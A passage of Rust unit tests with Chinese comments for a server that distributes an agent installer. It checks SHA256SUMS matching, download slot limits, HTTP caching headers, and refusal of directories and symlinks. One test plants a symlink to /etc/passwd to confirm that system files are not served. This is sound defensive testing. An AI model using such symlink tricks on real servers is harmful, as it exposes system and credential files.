        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\n").unwrap();
        std::fs::write(d.join(".hidden"), "x").unwrap();
        std::fs::create_dir_all(d.join("sub")).unwrap();
        let s = status(Some(&d), &NO_TRUST, NOW);
        assert!(!s.available);
        assert!(
            s.reason
                .as_ref()
                .unwrap()
                .contains("SHA256SUMS、SHA256SUMS.sig"),
            "{s:?}"
        );
        assert_eq!(s.files, ["pulse-install.sh"], "隱藏檔與子目錄不列出");
        // 缺檔是 KRS-W2012
        assert_eq!(s.code, Some(CODE_INCOMPLETE));
        assert_eq!(
            status_json(Some(&d), &NO_TRUST, NOW, "https://k:8444/agent")["product_code"],
            "KRS-W2012"
        );
        let hash = kairos_proto::enroll::sha256_hex(b"#!/bin/sh\n");
        std::fs::write(
            d.join("SHA256SUMS"),
            format!(
                "{}  pulse_0.9.0_amd64.deb\n{hash}  pulse-install.sh\n",
                "0".repeat(64)
            ),
        )
        .unwrap();
        std::fs::write(d.join("SHA256SUMS.sig"), "sig").unwrap();
        let v = status_json(Some(&d), &NO_TRUST, NOW, "https://k:8444/agent");
        assert_eq!(v["available"], true);
        assert_eq!(v["install_script"], "https://k:8444/agent/pulse-install.sh");
        assert_eq!(v["files"].as_array().unwrap().len(), 3);
        assert!(v["product_code"].is_null(), "可用時沒有代碼");
        // 安全稽核 C3：一行安裝指令要帶的腳本雜湊
        assert_eq!(v["install_script_sha256"], hash.as_str());
        let _ = std::fs::remove_dir_all(&d);
    }

    // 安全稽核 C3：腳本與同目錄的 SHA256SUMS 不符（被改過或放錯版本）時不提供一行安裝指令
    #[test]
    fn a_script_that_does_not_match_sha256sums_disables_the_one_liner() {
        let d = dir("script-hash");
        let hash = kairos_proto::enroll::sha256_hex(b"#!/bin/sh\necho ok\n");
        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho ok\n").unwrap();
        std::fs::write(d.join("SHA256SUMS"), format!("{hash} *pulse-install.sh\n")).unwrap();
        std::fs::write(d.join("SHA256SUMS.sig"), "sig").unwrap();
        assert_eq!(
            status(Some(&d), &NO_TRUST, NOW).install_script_sha256,
            Some(hash)
        );
        // 腳本被換掉
        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho changed\n").unwrap();
        let s = status(Some(&d), &NO_TRUST, NOW);
        assert!(!s.available, "{s:?}");
        assert!(s.reason.as_ref().unwrap().contains("SHA256SUMS"), "{s:?}");
        // 「不相符」有自己的代碼，不再與缺檔共用 KRS-W2012
        assert_eq!(s.code, Some(CODE_SCRIPT_MISMATCH));
        let v = status_json(Some(&d), &NO_TRUST, NOW, "https://k:8444/agent");
        assert_eq!(v["available"], false);
        assert_eq!(v["product_code"], "KRS-W2013");
        assert!(v["base_url"].is_null() && v["install_script_sha256"].is_null());
        // SHA256SUMS 沒有列出腳本（舊的發佈包）：以實際內容的雜湊為準
        std::fs::write(d.join("SHA256SUMS"), "x  other\n").unwrap();
        let s = status(Some(&d), &NO_TRUST, NOW);
        assert!(s.available);
        assert_eq!(
            s.install_script_sha256,
            Some(kairos_proto::enroll::sha256_hex(
                b"#!/bin/sh\necho changed\n"
            ))
        );
        // 腳本是符號連結：不提供
        #[cfg(unix)]
        {
            std::fs::remove_file(d.join("pulse-install.sh")).unwrap();
            std::fs::write(d.join("real.sh"), "#!/bin/sh\n").unwrap();
            std::os::unix::fs::symlink(d.join("real.sh"), d.join("pulse-install.sh")).unwrap();
            let s = status(Some(&d), &NO_TRUST, NOW);
            assert!(!s.available);
            // 符號連結不算目錄中的檔案：歸在缺檔
            assert_eq!(s.code, Some(CODE_INCOMPLETE), "{s:?}");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn slots_limit_per_source_and_in_total_and_are_released() {
        let s = Arc::new(Slots::default());
        let a: IpAddr = "10.0.0.1".parse().unwrap();
        let b: IpAddr = "10.0.0.2".parse().unwrap();
        let x = s.take(a, 2, 3).unwrap();
        let _y = s.take(a, 2, 3).unwrap();
        assert!(s.take(a, 2, 3).is_none(), "同一來源上限");
        let _z = s.take(b, 2, 3).unwrap();
        assert!(s.take(b, 2, 3).is_none(), "全部上限");
        drop(x);
        assert_eq!(s.in_use(), 2);
        assert!(s.take(b, 2, 3).is_some());
    }

    #[tokio::test]
    async fn files_are_streamed_with_headers_and_conditional_requests() {
        use http_body_util_lite::collect;
        let d = dir("serve");
        let data = vec![7u8; 200_000];
        std::fs::write(d.join("pulse_0.9.0_amd64.deb"), &data).unwrap();
        std::fs::write(d.join("SHA256SUMS"), "x\n").unwrap();
        let slots = Arc::new(Slots::default());
        let ip: IpAddr = "10.0.0.9".parse().unwrap();
        let resp = respond(
            &d,
            "pulse_0.9.0_amd64.deb",
            false,
            None,
            slots.take(ip, 1, 1).unwrap(),
        )
        .await
        .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let h = resp.headers().clone();
        assert_eq!(h["content-type"], "application/vnd.debian.binary-package");
        assert_eq!(h["content-length"], "200000");
        assert_eq!(h["cache-control"], "public, max-age=3600");
        assert_eq!(h["x-content-type-options"], "nosniff");
        assert!(
            h["content-disposition"]
                .to_str()
                .unwrap()
                .contains("attachment")
        );
        assert!(slots.take(ip, 1, 1).is_none(), "傳送中佔用名額");
        let body = collect(resp.into_body()).await;
        assert_eq!(body, data);
        // 本文送完後釋放名額
        let mut ok = false;
        for _ in 0..50 {
            if slots.in_use() == 0 {
                ok = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        assert!(ok);
        // If-None-Match → 304；HEAD 沒有本文；SHA256SUMS 不長期快取
        let tag = h["etag"].to_str().unwrap().to_string();
        let r = respond(
            &d,
            "pulse_0.9.0_amd64.deb",
            false,
            Some(&tag),
            slots.take(ip, 1, 1).unwrap(),
        )
        .await
        .unwrap();
        assert_eq!(r.status(), StatusCode::NOT_MODIFIED);
        let r = respond(&d, "SHA256SUMS", true, None, slots.take(ip, 1, 1).unwrap())
            .await
            .unwrap();
        assert_eq!(r.headers()["cache-control"], "no-cache");
        assert!(collect(r.into_body()).await.is_empty());
        // 不存在、目錄、符號連結：None（404）
        std::fs::create_dir_all(d.join("sub")).unwrap();
        for n in ["missing.deb", "sub"] {
            assert!(
                respond(&d, n, false, None, slots.take(ip, 1, 1).unwrap())
                    .await
                    .is_none()
            );
        }
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink("/etc/passwd", d.join("link.txt")).unwrap();
            assert!(
                respond(&d, "link.txt", false, None, slots.take(ip, 1, 1).unwrap())
                    .await
                    .is_none()
            );
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// 測試用：把 [`ApiBody`] 讀完
    mod http_body_util_lite {
        use super::super::ApiBody;
        use hyper::body::Body;

        pub async fn collect(mut body: ApiBody) -> Vec<u8> {
            let mut out = Vec::new();
            loop {
                let frame =
                    std::future::poll_fn(|cx| std::pin::Pin::new(&mut body).poll_frame(cx)).await;
                match frame {
                    Some(Ok(f)) => {
                        if let Ok(d) = f.into_data() {
                            out.extend_from_slice(&d);
                        }
                    }
                    _ => break,
                }
            }
            out
        }
    }
}
